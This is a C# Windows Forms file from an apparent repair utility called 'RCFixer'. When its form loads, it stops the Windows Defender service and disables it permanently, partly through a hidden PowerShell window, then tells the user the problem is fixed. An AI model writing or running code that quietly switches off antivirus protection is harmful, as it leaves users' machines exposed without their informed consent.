using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace RCFixer.repair
{
    public partial class _3 : Form
    {
        public _3()
        {
            InitializeComponent();
            if (!RCFixer.Settings.Default.TR)
            {
                label1.Text = langEN.Repair1Solutionlabel1Repairing;
            }
            else
            {
                label1.Text = "Onarılıyor...";
            }
        }

        private void _1_MouseDown(object sender, MouseEventArgs e)
        {
            WinAPI.ReleaseCapture();
            WinAPI.SendMessage(this.Handle, 0x112, 0xf012, 0);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        private void Remedy1_DoWork(object sender, EventArgs e)
        {
            WinAPI.ReleaseCapture();
            WinAPI.SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            WinAPI.ReleaseCapture();
            WinAPI.SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void ıconButton1_Click(object sender, EventArgs e)
        {

        }

        private void _2_FormClosed(object sender, FormClosedEventArgs e)
        {
            this.Close();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
        private void _1_Load(object sender, EventArgs e)
        {
            Thread s = new Thread(Proc);
            s.Start();
            //Remedy1.RunWorkerAsync();
        }

        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
        public bool IsConnectedToInternet()
        {
            bool returnValue = false;
            try
            {

                int Desc;
                returnValue = InternetGetConnectedState(out Desc, 0);
            }
            catch
            {
                returnValue = false;
            }
            return returnValue;
        }
        private void disabledefender()
        {
            Process.Start(new ProcessStartInfo("cmd", "/c net stop WinDefend")
            {
                WindowStyle = ProcessWindowStyle.Normal
            });
            Process.Start(new ProcessStartInfo("powershell", "-command \"Set-Service -Name WinDefend -StartupType Disabled\"")
            {
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Thread.Sleep(4000);
            if (!RCFixer.Settings.Default.TR)
            {
                label1.Text = langEN.Repair1Solutionlabel1Repaired;
                MessageBox.Show(langEN.Repair1Solution2MsgBox1, "RCFixer", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                label1.Text = "Onarım tamamlandı.";
                MessageBox.Show("İşlemler tamamlandı. Sorununuz düzeltilmiştir.", "RCFixer", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            // Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", "Start", 4);
        }
        void Proc()
        {
            disabledefender();
            if (IsConnectedToInternet())
            {

            }
            else
            {
               
            }
        }
        private void Remedy1_DoWork_1(object sender, DoWorkEventArgs e)
        {
            Proc();
        }
    }
}
